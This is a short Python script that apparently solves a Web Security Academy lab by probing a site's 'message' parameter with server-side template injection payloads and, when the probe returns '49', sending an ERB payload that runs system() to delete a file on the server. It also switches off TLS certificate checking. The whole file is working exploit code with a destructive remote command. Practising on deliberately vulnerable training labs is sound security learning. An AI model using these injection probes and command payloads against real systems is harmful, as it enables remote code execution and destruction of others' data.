import urllib.parse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

payloads = ["[{{7*7}}", "${7*7}", "<%= 7*7 %>", "${{7*7}}", "#{7*7}"]

def send_request(payload):
    r = requests.get("https://0a0100d703daa4a9c2812a13003b00f4.web-security-academy.net/?message=" + url_encode(payload), verify=False)
    return r.text

def url_encode(payload):
    encoded_payload = urllib.parse.quote_plus(payload)
    return encoded_payload


for payload in payloads:
    re = send_request(payload)
    if "49" in re:
        exploit = '<%= system("rm /home/carlos/morale.txt") %>'
        exploited_request = send_request(exploit)
        if "Solved" in exploited_request:
            print("You solved the lab :)")
